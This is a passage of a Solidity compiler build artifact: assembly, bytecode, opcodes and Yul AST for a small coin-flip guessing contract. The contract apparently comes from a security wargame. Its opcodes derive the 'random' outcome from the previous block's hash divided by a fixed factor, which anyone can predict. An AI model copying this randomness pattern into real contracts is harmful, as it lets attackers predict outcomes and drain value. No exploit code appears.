\"#utility.yul\":1766:1832   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1759:1764   */\n      dup3\n        /* \"#utility.yul\":1756:1833   */\n      eq\n        /* \"#utility.yul\":1753:1755   */\n      iszero\n      tag_63\n      jumpi\n        /* \"#utility.yul\":1836:1854   */\n      tag_64\n      tag_58\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1753:1755   */\n    tag_63:\n        /* \"#utility.yul\":1883:1884   */\n      0x01\n        /* \"#utility.yul\":1876:1881   */\n      dup3\n        /* \"#utility.yul\":1872:1885   */\n      add\n        /* \"#utility.yul\":1865:1885   */\n      swap1\n      pop\n        /* \"#utility.yul\":1701:1891   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1897:2077   */\n    tag_58:\n        /* \"#utility.yul\":1945:2022   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1942:1943   */\n      0x00\n        /* \"#utility.yul\":1935:2023   */\n      mstore\n        /* \"#utility.yul\":2042:2046   */\n      0x11\n        /* \"#utility.yul\":2039:2040   */\n      0x04\n        /* \"#utility.yul\":2032:2047   */\n      mstore\n        /* \"#utility.yul\":2066:2070   */\n      0x24\n        /* \"#utility.yul\":2063:2064   */\n      0x00\n        /* \"#utility.yul\":2056:2071   */\n      revert\n        /* \"#utility.yul\":2083:2263   */\n    tag_52:\n        /* \"#utility.yul\":2131:2208   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2128:2129   */\n      0x00\n        /* \"#utility.yul\":2121:2209   */\n      mstore\n        /* \"#utility.yul\":2228:2232   */\n      0x12\n        /* \"#utility.yul\":2225:2226   */\n      0x04\n        /* \"#utility.yul\":2218:2233   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x24\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2242:2257   */\n      revert\n        /* \"#utility.yul\":2269:2385   */\n    tag_31:\n        /* \"#utility.yul\":2339:2360   */\n      tag_68\n        /* \"#utility.yul\":2354:2359   */\n      dup2\n        /* \"#utility.yul\":2339:2360   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2332:2337   */\n      dup2\n        /* \"#utility.yul\":2329:2361   */\n      eq\n        /* \"#utility.yul\":2319:2321   */\n      tag_69\n      jumpi\n        /* \"#utility.yul\":2375:2376   */\n      0x00\n        /* \"#utility.yul\":2372:2373   */\n      dup1\n        /* \"#utility.yul\":2365:2377   */\n      revert\n        /* \"#utility.yul\":2319:2321   */\n    tag_69:\n        /* \"#utility.yul\":2309:2385   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f774e5a9fdad64946a77b26607e4b292f48affa09f109927973acf2b3c22b8ee64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103278061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220f774e5a9fdad64946a77b26607e4b292f48affa09f109927973acf2b3c22b8ee64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x327 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF7 PUSH21 0xE5A9FDAD64946A77B26607E4B292F48AFFA09F1099 0x27 SWAP8 GASPRICE 0xCF 0x2B EXTCODECOPY 0x22 0xB8 0xEE PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "60:766:0:-:0;;;162:77;145:94;;248:52;;;;;;;;;;291:1;273:15;:19;;;;60:766;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2388:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "56:84:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "66:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "88:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "75:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "75:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "66:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "128:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "104:23:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "104:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "104:30:1"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "34:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "42:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "50:5:1",
														"type": ""
													}
												],
												"src": "7:133:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "209:193:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "255:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "264:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "267:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "257:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "257:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "257:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "230:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "239:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "226:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "226:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "251:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "222:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "222:32:1"
															},
															"nodeType": "YulIf",
															"src": "219:2:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "281:114:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "296:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "310:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "300:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "325:60:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "357:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "368:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "353:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "353:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "377:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "335:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "335:50:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "325:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "179:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "190:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "202:6:1",
														"type": ""
													}
												],
												"src": "146:256:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "467:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "484:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "504:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "489:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "489:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "477:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "477:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "477:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "455:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "462:3:1",
														"type": ""
													}
												],
												"src": "408:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "588:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "605:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "628:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "610:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "610:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "598:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "598:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "598:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "576:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "583:3:1",
														"type": ""
													}
												],
												"src": "523:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "739:118:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "749:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "761:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "772:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "757:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "757:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "749:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "823:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "836:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "847:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "832:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "832:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "785:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "785:65:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "711:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "723:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "734:4:1",
														"type": ""
													}
												],
												"src": "647:210:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "961:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "971:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "983:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "994:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "979:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "979:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "971:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1051:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1064:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1075:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1060:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1060:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1007:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1007:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1007:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "933:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "945:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "956:4:1",
														"type": ""
													}
												],
												"src": "863:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1133:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1143:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1166:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1148:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1148:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1143:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1177:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1200:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1182:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1182:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1177:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1224:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1226:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1226:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1226:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1221:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1214:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1214:9:1"
															},
															"nodeType": "YulIf",
															"src": "1211:2:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1256:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1265:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1268:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1261:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1261:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1256:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1122:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1125:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1131:1:1",
														"type": ""
													}
												],
												"src": "1091:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1327:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1337:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1360:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1342:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1342:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1337:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1371:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1394:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1376:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1376:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1371:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1418:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1420:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1420:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1420:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1412:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1415:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1409:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1409:8:1"
															},
															"nodeType": "YulIf",
															"src": "1406:2:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1450:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1462:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1465:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1458:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1458:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1450:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1313:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1316:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1322:4:1",
														"type": ""
													}
												],
												"src": "1282:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1521:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1531:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1556:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1549:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1549:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1542:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1542:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1531:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1503:5:1",
														"type": ""
													}
												],
												"returnVariables": [
